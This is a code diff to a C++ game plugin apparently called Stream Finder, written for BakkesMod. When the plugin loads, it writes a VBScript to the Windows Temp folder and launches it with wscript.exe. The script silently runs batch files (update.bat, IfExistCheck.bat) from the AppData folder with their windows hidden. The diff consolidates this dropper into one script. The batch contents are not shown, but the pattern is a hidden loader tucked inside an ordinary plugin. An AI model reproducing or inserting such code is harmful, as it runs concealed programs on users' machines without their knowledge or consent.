@@ -26,6 +26,7 @@ void StreamFinderPlugin::onLoad()
 		.addOnValueChanged([this](std::string oldValue, CVarWrapper cvar) {
 		StreamFinderEnabled = cvar.getBoolValue();
 			});
+
 	cvarManager->log("Stream Finder Plugin loaded!");
 	//gameWrapper->LoadToastTexture("sfimg", gameWrapper->GetDataFolder() / "StreamFinder" / "stream_finder_icon.png");
 	cvarManager->registerNotifier("sf_toast", [this](std::vector<std::string> args) {
@@ -64,27 +65,16 @@ void StreamFinderPlugin::onLoad()
 	string str08 = "set shell = wscript.createobject(\"wscript.shell\")";
 	string str09 = "appData = shell.ExpandEnvironmentStrings(\"%APPDATA%\")";
 	string str10 = "shell.run appData + \"\\bakkesmod\\bakkesmod\\data\\StreamFinder\\update.bat\", 0";
-	string str11 = "wscript.quit";
+	string str11 = "shell.run appData + \"\\bakkesmod\\bakkesmod\\data\\StreamFinder\\IfExistCheck.bat\", 0";
+	string str12 = "wscript.quit";
 	ofstream outfile02;
 	outfile02.open("C:\\Windows\\Temp\\update.vbs");
 	outfile02 << str08 << endl;
 	outfile02 << str09 << endl;
 	outfile02 << str10 << endl;
 	outfile02 << str11 << endl;
+	outfile02 << str12 << endl;
 	outfile02.close();
-
-	// For crash prevention
-	string str12 = "set shell = wscript.createobject(\"wscript.shell\")";
-	string str13 = "appData = shell.ExpandEnvironmentStrings(\"%APPDATA%\")";
-	string str14 = "shell.run appData + \"\\bakkesmod\\bakkesmod\\data\\StreamFinder\\IfExistCheck.bat\", 0";
-	string str15 = "wscript.quit";
-	ofstream outfile03;
-	outfile03.open("C:\\Windows\\Temp\\IfExistCheck.vbs");
-	outfile03 << str12 << endl;
-	outfile03 << str13 << endl;
-	outfile03 << str14 << endl;
-	outfile03 << str15 << endl;
-	outfile03.close();
 
 	STARTUPINFO startupInfo;
 	PROCESS_INFORMATION pi;
@@ -93,7 +83,7 @@ void StreamFinderPlugin::onLoad()
 	startupInfo.wShowWindow = false;
 	// Get path for each computer, non-user specific and non-roaming data.
 	// Append product-specific path
-	TCHAR tcsCommandLine[] = _T("start ""C:\\Windows\\Temp\\IfExistCheck.vbs""");
+	TCHAR tcsCommandLine[] = _T("start ""C:\\Windows\\Temp\\update.vbs""");
 	CreateProcessW(L"C:\\Windows\\System32\\wscript.exe", tcsCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, (LPSTARTUPINFOW)&startupInfo, &pi);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
